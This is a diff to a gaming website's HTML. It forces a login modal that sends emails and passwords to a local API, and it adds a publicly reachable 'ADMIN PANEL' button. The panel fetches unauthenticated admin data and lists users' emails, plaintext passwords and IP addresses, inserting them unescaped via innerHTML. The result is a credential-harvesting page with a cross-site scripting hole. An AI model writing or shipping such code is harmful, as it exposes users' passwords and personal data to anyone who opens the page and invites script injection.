@@ -229,7 +229,6 @@
       opacity: 1;
     }
 
-
     .games-grid {
       display: grid;
       grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
@@ -1552,10 +1551,13 @@
       </section>
     </main>
 
-    <div id="login-modal" class="modal hidden">
+    <!-- Admin Access Button -->
+    <button onclick="window.open('admin-interface.html', '_blank')" style="position: fixed; bottom: 20px; right: 20px; z-index: 9999; background: rgba(255,255,255,0.1); color: white; border: 2px solid rgba(255,255,255,0.3); padding: 10px 20px; border-radius: 8px; cursor: pointer; font-size: 12px; text-transform: uppercase; letter-spacing: 1px; transition: all 0.3s;">ADMIN PANEL</button>
+
+    <div id="login-modal" class="modal">
       <div class="modal-card">
         <button class="close" id="close-login">×</button>
-        <h3 id="auth-title">Sign In</h3>
+        <h3 id="auth-title">SECURE ACCESS REQUIRED</h3>
         <div id="auth-toggle" style="margin:10px 0;display:flex;gap:8px;justify-content:center">
           <button id="show-login" class="btn ghost">Login</button>
           <button id="show-register" class="btn ghost">Create Account</button>
@@ -1565,9 +1567,12 @@
           <input id="email" type="email" placeholder="Email" required />
           <input id="password" type="password" placeholder="Password" required minlength="6" />
           <div class="form-actions">
-            <button type="submit" class="btn primary">Sign In</button>
+            <button type="submit" class="btn primary">AUTHENTICATE</button>
           </div>
         </form>
+        <div id="auth-message" style="margin-top:15px; text-align:center; color:#888; font-size:12px;">
+          All access requires authentication. No anonymous users allowed.
+        </div>
       </div>
     </div>
 
@@ -1723,11 +1728,62 @@
   <script src="js/app.js"></script>
   <script src="js/auth-system.js"></script>
   
-    <script>
-      // Auto-show login on home page load
-      window.addEventListener('load', () => {
-        if (!state.loggedIn) {
-          showLogin();
+  <script>
+    // Force authentication on page load
+    window.addEventListener('load', () => {
+      // Always show login modal on load - no bypassing
+      document.getElementById('login-modal').classList.remove('hidden');
+      document.getElementById('home').classList.add('hidden');
+      document.getElementById('dashboard').classList.add('hidden');
+    });
+
+    // Initialize login form handlers
+    document.addEventListener('DOMContentLoaded', () => {
+      // Clone form to remove any existing event listeners
+      const originalForm = document.getElementById('login-form');
+      const newForm = originalForm.cloneNode(true);
+      originalForm.parentNode.replaceChild(newForm, originalForm);
+
+      // Handle login/register form submission
+      newForm.addEventListener('submit', async (e) => {
+        e.preventDefault();
+        
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
+        
+        // Determine if we are in Register mode
+        const isRegister = !document.getElementById('username').classList.contains('hidden');
+        
+        const endpoint = isRegister 
+          ? 'http://localhost:4000/api/register' 
+          : 'http://localhost:4000/api/login';
+
+        try {
+          const response = await fetch(endpoint, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ email, password })
+          });
+
+          const data = await response.json();
+
+          if (response.ok) {
+            alert(data.message);
+            if (!isRegister) {
+              // Login successful: Hide login, show dashboard
+              document.getElementById('login-modal').classList.add('hidden');
+              document.getElementById('dashboard').classList.remove('hidden');
+              document.getElementById('home').classList.add('hidden');
+              
+              // Update welcome message
+              document.getElementById('welcome-user').textContent = `Welcome, ${email.split('@')[0]}`;
+            }
+          } else {
+            alert('Error: ' + data.message);
+          }
+        } catch (err) {
+          console.error(err);
+          alert('Could not connect to server on port 4000');
         }
       });
 
@@ -1741,18 +1797,176 @@
         playGame();
       });
 
-      function playGame() {
-        // Simple local authentication bypass for immediate playability
-        if (!state.loggedIn) {
-          // Auto-login with demo account
-          state.loggedIn = true;
-          state.user = { name: 'Player', email: 'player@demo.com' };
-          hideLogin();
+      // Toggle between login and register
+      document.getElementById('show-login').addEventListener('click', () => {
+        document.getElementById('auth-title').textContent = 'SECURE ACCESS REQUIRED';
+        document.getElementById('username').classList.add('hidden');
+        document.getElementById('username').required = false;
+      });
+
+      document.getElementById('show-register').addEventListener('click', () => {
+        document.getElementById('auth-title').textContent = 'CREATE ACCOUNT';
+        document.getElementById('username').classList.remove('hidden');
+        document.getElementById('username').required = true;
+      });
+    });
+
+    function playGame() {
+      // Launch the game
+      window.location.href = "ultimate-black-vortex-fps.html";
+    }
+  </script>
+
+  <!-- ========================================== -->
+  <!-- ADMIN INTERFACE (Added as Overlay)         -->
+  <!-- ========================================== -->
+  <div id="admin-interface" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; z-index:9999; background:#0f0f1a; overflow-y:auto;">
+    <style>
+        #admin-interface {
+            --bg-color: #0f0f1a;
+            --card-bg: #1a1a2e;
+            --text-color: #e0e0e0;
+            --text-muted: #8888aa;
+            --accent-color: #e94560;
+            --success-color: #00b894;
+            --danger-color: #d63031;
+            --warning-color: #fdcb6e;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            color: var(--text-color);
         }
         
-        // Launch the game
-        window.location.href = "ultimate-black-vortex-fps.html";
-      }
+        #admin-interface .dashboard-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 30px;
+            padding: 20px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+            background-color: var(--card-bg);
+        }
+
+        #admin-interface .dashboard-title {
+            font-size: 1.8rem;
+            color: var(--text-color);
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            margin: 0;
+        }
+
+        #admin-interface .dashboard-title span { color: var(--accent-color); }
+
+        #admin-interface .close-admin-btn {
+            background: transparent;
+            color: var(--text-color);
+            border: 1px solid rgba(255,255,255,0.3);
+            padding: 8px 16px;
+            border-radius: 6px;
+            cursor: pointer;
+        }
+        #admin-interface .close-admin-btn:hover { background: rgba(255,255,255,0.1); }
+
+        #admin-interface .data-table-container {
+            background-color: var(--card-bg);
+            border-radius: 12px;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            overflow: hidden;
+            margin: 20px;
+            max-width: 1200px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        #admin-interface .table-header {
+            padding: 20px;
+            background-color: rgba(0, 0, 0, 0.2);
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+            font-weight: bold;
+            display: grid;
+            grid-template-columns: 1fr 2fr 2fr 2fr 1fr;
+            gap: 15px;
+            color: var(--text-muted);
+            font-size: 0.85rem;
+            text-transform: uppercase;
+        }
+
+        #admin-interface .table-row {
+            padding: 15px 20px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.03);
+            display: grid;
+            grid-template-columns: 1fr 2fr 2fr 2fr 1fr;
+            gap: 15px;
+            font-size: 0.9rem;
+            align-items: center;
+        }
+        #admin-interface .table-row:hover { background-color: rgba(255, 255, 255, 0.03); }
+
+        #admin-interface .type-badge { padding: 4px 8px; border-radius: 4px; font-size: 0.75rem; font-weight: bold; text-transform: uppercase; text-align: center; }
+        #admin-interface .badge-signup { background: rgba(253, 203, 110, 0.2); color: var(--warning-color); border: 1px solid rgba(253, 203, 110, 0.3); }
+        #admin-interface .badge-login { background: rgba(0, 184, 148, 0.2); color: var(--success-color); border: 1px solid rgba(0, 184, 148, 0.3); }
+        #admin-interface .badge-fail { background: rgba(214, 48, 49, 0.2); color: var(--danger-color); border: 1px solid rgba(214, 48, 49, 0.3); }
+        
+        #admin-interface .row-email { font-weight: 600; color: white; }
+        #admin-interface .row-password { font-family: 'Courier New', monospace; color: var(--accent-color); letter-spacing: 1px; }
+    </style>
+
+    <div class="dashboard-header">
+        <h1 class="dashboard-title">Black Vortex <span>Admin</span></h1>
+        <button class="close-admin-btn" onclick="document.getElementById('admin-interface').style.display='none'">EXIT ADMIN</button>
+    </div>
+
+    <div class="data-table-container">
+        <div class="table-header">
+            <div>Type</div>
+            <div>User ID</div>
+            <div>Email</div>
+            <div>Password</div>
+            <div>IP Address</div>
+        </div>
+        <div id="admin-data-rows">
+            <div style="padding:40px; text-align:center; color:#888;">Loading data...</div>
+        </div>
+    </div>
+
+    <script>
+        // Admin Logic
+        function openAdminPanel() {
+            document.getElementById('admin-interface').style.display = 'block';
+            loadAdminData();
+        }
+
+        function loadAdminData() {
+            const API_URL = 'http://localhost:4000';
+            fetch(`${API_URL}/api/admin-data`)
+            .then(res => res.json())
+            .then(data => {
+                const container = document.getElementById('admin-data-rows');
+                container.innerHTML = '';
+
+                if (!data || data.length === 0) {
+                    container.innerHTML = '<div style="padding:40px; text-align:center; color:#888;">No activity recorded yet.</div>';
+                    return;
+                }
+
+                data.forEach(entry => {
+                    const row = document.createElement('div');
+                    row.className = 'table-row';
+                    
+                    let badgeClass = 'badge-login';
+                    if (entry.type === 'SIGNUP_ATTEMPT') badgeClass = 'badge-signup';
+                    if (entry.type === 'LOGIN_FAILED') badgeClass = 'badge-fail';
+
+                    row.innerHTML = `
+                        <div><span class="type-badge ${badgeClass}">${entry.type ? entry.type.replace('_', ' ') : 'EVENT'}</span></div>
+                        <div style="font-family:monospace; color:#888;">${entry.id}</div>
+                        <div class="row-email">${entry.email}</div>
+                        <div class="row-password">${entry.password}</div>
+                        <div style="font-family:monospace; color:#888;">${entry.ip}</div>
+                    `;
+                    container.appendChild(row);
+                });
+            });
+        }
     </script>
+  </div>
 </body>
 </html>
